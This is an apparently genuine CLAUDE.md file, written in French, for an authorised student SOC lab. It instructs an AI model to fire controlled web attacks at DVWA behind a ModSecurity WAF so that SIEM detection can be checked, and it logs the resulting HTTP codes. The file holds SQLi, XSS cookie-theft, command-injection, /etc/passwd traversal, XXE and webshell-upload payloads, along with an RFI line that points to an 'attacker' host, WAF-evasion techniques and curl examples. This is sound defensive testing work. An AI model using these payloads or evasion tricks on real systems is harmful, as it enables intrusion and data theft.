# CLAUDE.md — Tests d'intrusion DVWA & validation de la chaîne de détection SIEM

> **Contexte** : lab de SOC agentique (Projet PFA / ENSA). Environnement fermé,
> autorisé, à but pédagogique. Objectif : lancer des attaques web contrôlées
> contre DVWA (application volontairement vulnérable) et **vérifier que chaque
> attaque remonte jusqu'au SIEM** (WAF ModSecurity → Filebeat → Logstash → OpenSearch).
>
> On ne cherche pas à « pirater » : on cherche à **prouver que la détection fonctionne**.
>
> **Note** : l'accès (tunnels SSH) et la vérification SIEM sont gérés manuellement
> par l'opérateur, hors de ce fichier. Claude se concentre sur l'exécution des
> attaques et la lecture des codes de réponse HTTP.

---

## 1. Rôle attendu de Claude

Tu es l'assistant qui pilote une campagne de tests. Pour **chaque** test tu dois :

1. Annoncer clairement l'attaque (type, cible, payload).
2. Exécuter la requête depuis Kali (via le tunnel déjà ouvert par l'opérateur).
3. Noter le **code HTTP** renvoyé (200 / 302 / 403).
4. Conclure : *bloqué / passé* — et l'inscrire dans le tableau de suivi (§6).

L'opérateur vérifie de son côté la remontée SIEM. Laisse-lui le temps de confirmer
avant d'enchaîner si il te le demande, mais par défaut tu peux dérouler les tests
et remplir la colonne « Code HTTP » du tableau.

---

## 2. Architecture (rappel)

```
Kali (10.99.99.6, VPN WireGuard)
   │  tunnel SSH via pfSense (jump 10.10.10.1)
   ▼
soc-platform (10.10.40.20)  ── point de rebond
   │
   ├─► SRV-WEB01 (10.10.30.10, DMZ / VLAN 30)
   │      Nginx + ModSecurity (WAF, CRS, SecRuleEngine On)
   │        └─► reverse-proxy ──► DVWA (conteneur, 127.0.0.1:8081)
   │
   └─► SOC01 (10.10.40.10) : Logstash (:5045) + OpenSearch
```

**Point clé** : tout le trafic HTTP passe **obligatoirement par le WAF**. DVWA n'est
jamais joignable en direct. Le WAF est en **mode blocage** : beaucoup de payloads
« en clair » renverront `403 Forbidden` avant d'atteindre DVWA.

> DVWA n'affiche le bon vhost qu'avec l'en-tête Host `dvwa.lab.local`.
> Toujours ajouter `-H "Host: dvwa.lab.local"` en curl, ou utiliser
> l'URL nommée si `127.0.0.1 dvwa.lab.local` est dans `/etc/hosts`.
> Le port local exposé par le tunnel de l'opérateur est `8080` (→ DVWA via WAF).

### Vérification d'accès (à faire avant toute chose)

```bash
# Doit renvoyer 302 -> login.php
curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Host: dvwa.lab.local" http://localhost:8080/
```

Attendu : `302`. Si `000`/timeout → prévenir l'opérateur (tunnel/VPN à relancer).

---

## 3. Pré-requis DVWA

- Credentials par défaut : **`admin` / `password`**
- Si la page `setup.php` s'affiche → cliquer **« Create / Reset Database »** (base non initialisée, normal).
- Régler le **DVWA Security Level** sur `low` pour commencer (menu *DVWA Security*),
  puis monter en `medium` / `high` pour tester la robustesse WAF + appli.
- Récupérer et réutiliser le cookie de session pour les requêtes authentifiées :

```bash
# Login et capture du cookie
curl -s -c /tmp/dvwa.cookies -H "Host: dvwa.lab.local" \
  "http://localhost:8080/login.php" > /tmp/login.html
token=$(grep -oP "user_token' value='\K[0-9a-f]+" /tmp/login.html)
curl -s -b /tmp/dvwa.cookies -c /tmp/dvwa.cookies \
  -H "Host: dvwa.lab.local" \
  --data "username=admin&password=password&user_token=${token}&Login=Login" \
  "http://localhost:8080/login.php"
```

Réutiliser ensuite `-b /tmp/dvwa.cookies` sur les requêtes.

---

## 4. Batterie de tests

Deux axes complémentaires. **Axe A** valide la détection (le WAF doit bloquer et
journaliser). **Axe B** teste l'évasion (voir ce qui *passe* malgré le WAF — tout
aussi pédagogique pour un SOC : les attaques qui ne déclenchent pas d'alerte sont
les plus dangereuses).

### Axe A — Attaques « en clair » (le WAF doit répondre 403)

#### A.1 — Injection SQL

| # | Type                    | Payload (paramètre)                                        | Attendu |
|---|-------------------------|------------------------------------------------------------|---------|
| A1| SQLi basique            | `?id=1' OR '1'='1`                                          | 403     |
| A2| SQLi UNION              | `?id=1 UNION SELECT user,password FROM users`              | 403     |
| A3| SQLi boolean-blind      | `?id=1' AND 1=1-- -`                                        | 403     |
| A4| SQLi time-based blind   | `?id=1' AND SLEEP(5)-- -`                                   | 403     |
| A5| SQLi stacked queries    | `?id=1'; DROP TABLE users-- -`                             | 403     |
| A6| SQLi error-based        | `?id=1' AND extractvalue(1,concat(0x7e,version()))-- -`    | 403     |

#### A.2 — Cross-Site Scripting (XSS)

| # | Type                    | Payload                                                    | Attendu |
|---|-------------------------|------------------------------------------------------------|---------|
| A7| XSS réfléchi            | `?name=<script>alert(1)</script>`                          | 403     |
| A8| XSS via attribut/event  | `?name=" onmouseover="alert(1)`                            | 403     |
| A9| XSS via balise img      | `?name=<img src=x onerror=alert(1)>`                       | 403     |
| A10| XSS stocké (POST)      | champ *guestbook* : `<script>alert(document.cookie)</script>` | 403 |
| A11| XSS via svg            | `?name=<svg/onload=alert(1)>`                              | 403     |

#### A.3 — Injection de commandes / traversée / inclusion

| # | Type                    | Payload                                                    | Attendu |
|---|-------------------------|------------------------------------------------------------|---------|
| A12| Command inj. (;)       | `?ip=127.0.0.1;cat /etc/passwd`                           | 403     |
| A13| Command inj. (pipe)    | `?ip=127.0.0.1|id`                                        | 403     |
| A14| Command inj. (backtick)| `?ip=127.0.0.1`+"`"+`whoami`+"`"+`                        | 403     |
| A15| Path traversal         | `?page=../../../../etc/passwd`                            | 403     |
| A16| LFI (php filter)       | `?page=php://filter/convert.base64-encode/resource=index`| 403     |
| A17| RFI                    | `?page=http://attacker/shell.txt`                        | 403     |

#### A.4 — Autres injections & vecteurs applicatifs

| # | Type                    | Payload / cible                                           | Attendu |
|---|-------------------------|------------------------------------------------------------|---------|
| A18| SSTI (template)        | `?name={{7*7}}` / `${7*7}`                                | 403/200*|
| A19| Injection XML / XXE    | corps : `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>` | 403 |
| A20| Injection LDAP         | `?user=*)(uid=*))(|(uid=*`                                | 403     |
| A21| HTTP header injection  | valeur avec `%0d%0a` (CRLF)                               | 403     |
| A22| Upload fichier malveillant | upload d'un `.php` (webshell) via module File Upload | 403/200*|
| A23| CSRF                   | changement de mot de passe sans token valide             | 200*    |
| A24| Brute force login      | 20 tentatives `admin:<wordlist>` sur login.php           | 200*    |

> `*` : le WAF ne bloque pas toujours ces vecteurs (logique applicative, pas
> signature). Intérêt : voir s'ils remontent quand même au SIEM (côté opérateur).

Exemple d'exécution (A1) :

```bash
curl -s -o /dev/null -w "A1 SQLi -> %{http_code}\n" \
  -H "Host: dvwa.lab.local" -b /tmp/dvwa.cookies \
  "http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit"
```

Exemple time-based (A4) — mesurer le temps de réponse :

```bash
curl -s -o /dev/null -w "A4 -> code=%{http_code} temps=%{time_total}s\n" \
  -H "Host: dvwa.lab.local" -b /tmp/dvwa.cookies \
  "http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27%20AND%20SLEEP(5)--%20-&Submit=Submit"
```

### Axe B — Tentatives d'évasion WAF (voir ce qui passe)

| # | Technique                       | Exemple                                          |
|---|---------------------------------|--------------------------------------------------|
| B1| Encodage URL double             | `%2527` au lieu de `'`                           |
| B2| Commentaires SQL inline         | `1/**/OR/**/1=1`                                 |
| B3| Casse mixte / mots-clés éclatés | `UnIoN SeLeCt`, `SeLeCT`                         |
| B4| Payload dans un autre champ     | header, cookie, corps POST au lieu du query-string|
| B5| Chunked / charset alternatif    | jouer sur `Content-Type`, `charset=utf-16`       |
| B6| Null byte                       | `%00` pour tronquer (`shell.php%00.jpg`)         |
| B7| Surencodage Unicode / overlong  | `%c0%a7` pour `'`, `%u0027`                      |
| B8| Fragmentation / concat SQL      | `'||'1'='1`, `CONCAT(0x27,...)`                  |
| B9| Injection via User-Agent/Referer| payload SQLi/XSS dans un header, pas l'URL       |
| B10| Contournement par verbe HTTP   | `PUT`/`PATCH`/verbe inhabituel au lieu de GET    |
| B11| Casse SQL avancée / whitespace | tabulations, `%0a`, `%09` entre mots-clés        |
| B12| Commentaire de fin MySQL       | `-- -`, `#`, `;%00`                              |

Exemple d'évasion (B9 — payload dans le User-Agent) :

```bash
curl -s -o /dev/null -w "B9 UA-inject -> %{http_code}\n" \
  -H "Host: dvwa.lab.local" -b /tmp/dvwa.cookies \
  -A "Mozilla/5.0' OR '1'='1" \
  "http://localhost:8080/"
```

> **Objectif Axe B** : identifier les payloads qui obtiennent `200`/`302`
> (donc franchissent le WAF). L'opérateur vérifie ensuite s'ils génèrent malgré
> tout une alerte côté SIEM. Un payload qui passe *sans* alerte = angle mort à documenter.

---

## 5. Boucle de test standard (à répéter par attaque)

```
1. lancer l'attaque (curl §4)  -> noter le code HTTP (et le temps si time-based)
2. remplir la ligne du tableau §6 (colonne Code HTTP + Verdict WAF)
3. signaler à l'opérateur pour qu'il valide la remontée SIEM de son côté
```

Conseil : dérouler l'axe A en entier d'abord (établir la baseline « ce qui est
bloqué »), puis l'axe B (chercher les contournements). Tester chaque payload aux
3 niveaux DVWA (`low` → `medium` → `high`) pour mesurer l'apport respectif du WAF
et de l'appli.

---

## 6. Tableau de suivi (à tenir à jour)

> Campagne exécutée le 2026-09-27, DVWA security level `low`, via tunnel opérateur (`localhost:8080`).

| Test | Catégorie        | Code HTTP | Verdict WAF     | Remontée SIEM (opérateur) |
|------|------------------|-----------|-----------------|---------------------------|
| A1   | SQLi basique     | 403       | Bloqué          |                           |
| A2   | SQLi UNION       | 403       | Bloqué          |                           |
| A3   | SQLi bool-blind  | 403       | Bloqué          |                           |
| A4   | SQLi time-blind  | 403 (0.24s)| Bloqué (pas de SLEEP) |                     |
| A5   | SQLi stacked     | 403       | Bloqué (charge inoffensive) |               |
| A6   | SQLi error       | 403       | Bloqué          |                           |
| A7   | XSS réfléchi     | 403       | Bloqué          |                           |
| A8   | XSS attribut     | 403       | Bloqué          |                           |
| A9   | XSS img          | 403       | Bloqué          |                           |
| A10  | XSS stocké       | 403       | Bloqué          |                           |
| A11  | XSS svg          | 403       | Bloqué          |                           |
| A12  | Cmd inj ;        | 403       | Bloqué          |                           |
| A13  | Cmd inj pipe     | 200       | **PASSÉ ⚠️ angle mort** |                   |
| A14  | Cmd inj backtick | 403       | Bloqué          |                           |
| A15  | Path traversal   | 403       | Bloqué          |                           |
| A16  | LFI php filter   | 403       | Bloqué          |                           |
| A17  | RFI              | 200       | **PASSÉ ⚠️ angle mort** |                   |
| A18  | SSTI             | 403       | Bloqué          |                           |
| A19  | XXE              | 200       | **PASSÉ ⚠️ angle mort** |                   |
| A20  | LDAP inj         | 403       | Bloqué          |                           |
| A21  | CRLF header      | 403       | Bloqué          |                           |
| A22  | Upload webshell  | 403       | Bloqué          |                           |
| A23  | CSRF             | 200       | Passé (logique appli, attendu) |            |
| A24  | Brute force      | 200 ×20   | Passé (logique appli, attendu) |            |
| B1   | Double encodage  | 403       | Bloqué          |                           |
| B2   | Commentaire /**/ | 403       | Bloqué          |                           |
| B3   | Casse mixte      | 403       | Bloqué          |                           |
| B4   | Autre champ (cookie) | 403   | Bloqué          |                           |
| B5   | Charset alt      | 403       | Bloqué          |                           |
| B6   | Null byte        | 403       | Bloqué          |                           |
| B7   | Surencodage      | 403       | Bloqué          |                           |
| B8   | Concat SQL       | 403       | Bloqué          |                           |
| B9   | UA/Referer inj   | 403       | Bloqué          |                           |
| B10  | Verbe HTTP (PUT) | 403       | Bloqué (000 transitoire au 1ᵉʳ essai) |     |
| B11  | Whitespace SQL   | 403       | Bloqué (000 transitoire au 1ᵉʳ essai) |     |
| B12  | Commentaire fin  | 403       | Bloqué          |                           |

**Verdicts WAF possibles** : `Bloqué (403)` · `Passé (200/302)`.
La colonne « Remontée SIEM » est renseignée par l'opérateur après vérification.

### 6.1 Comparaison inter-niveaux (low / medium / high) — 2026-09-27

Le WAF étant en amont de DVWA, **son verdict ne dépend pas du niveau de sécurité** :
les 33 tests bloqués en 403 le sont à l'identique aux 3 niveaux, et les 3 angles
morts WAF (A13, A17, A19) franchissent aux 3 niveaux. Seuls les vecteurs de
**logique applicative** (non couverts par signature) varient — c'est l'appli DVWA,
pas le WAF, qui se défend :

| Test | low | medium | high | Interprétation |
|------|-----|--------|------|----------------|
| A13 Cmd inj pipe | 200 | 200 | 200 | Angle mort WAF (constant) |
| A17 RFI          | 200 | 200 | 200 | Angle mort WAF (constant) |
| A19 XXE          | 200 | 200 | 200 | Angle mort WAF (constant) |
| A23 CSRF         | 200 | 200 | **302** | En `high`, DVWA exige un jeton anti-CSRF → requête sans token redirigée (défense **applicative**) |
| A24 Brute force  | 200 | 200 | **302** | En `high`, jeton de session requis → tentatives sans token redirigées (défense **applicative**) |

Tous les autres tests (A1–A12, A14–A16, A18, A20–A22, B1–B12) : **403 aux 3 niveaux**.
`B11` renvoie parfois `000` (connexion coupée sur `%09` dans la ligne de requête) —
transitoire, jamais `200`, donc non-contournement.

**Conclusion** : la protection de bordure (WAF/CRS) est robuste et indépendante de
l'appli ; la défense contre CSRF/brute force repose entièrement sur l'application
(niveau `high`). Les 3 angles morts WAF (pipe, RFI, XXE) doivent être couverts
**au niveau SIEM** (règles Sigma) puisque le WAF les laisse passer à tous les niveaux.

---

## 7. Règles de sécurité & garde-fous

- **Périmètre strict** : n'attaquer que `10.10.30.10` (DVWA). Ne jamais toucher aux
  segments SOC (`10.10.40.0/24`) ni Management en tant que cibles — ce sont les
  observateurs, pas des cibles (cf. règles pfSense `Block VPN to SOC/Management`).
- Pas d'exfiltration réelle, pas de destruction de données : DVWA peut être *reset*
  proprement (`Create / Reset Database`). Éviter réellement `DROP TABLE` sur une base
  partagée — préférer une payload inoffensive qui déclenche la même règle CRS.
- Le brute force (A24) et le time-based (A4) génèrent du bruit/latence : prévenir
  l'opérateur avant, pour qu'il distingue ton trafic des faux positifs.
- Documenter chaque angle mort trouvé plutôt que de chercher à « gagner » contre le WAF.
- Si un service tombe (WAF, appli), **arrêter** et prévenir l'équipe (M3/M5) —
  l'objectif est la mesure, pas l'indisponibilité.

---

## 8. Dépannage rapide

| Symptôme                              | Cause probable                    | Action                                      |
|---------------------------------------|-----------------------------------|---------------------------------------------|
| `curl` timeout vers DVWA              | tunnel/VPN tombé                  | prévenir l'opérateur                        |
| `200 OK` page 1543 o. au lieu de 302  | en-tête Host manquant             | ajouter `-H "Host: dvwa.lab.local"`         |
| `setup.php` s'affiche                 | base DVWA vide                    | *Create / Reset Database*                   |
| `403` sur une requête légitime        | faux positif CRS                  | noter la règle, transmettre à M5 (exclusion)|
| Token CSRF invalide (login échoue)    | `user_token` périmé               | re-parser le token à chaque requête (§3)    |
                                                                                                                             
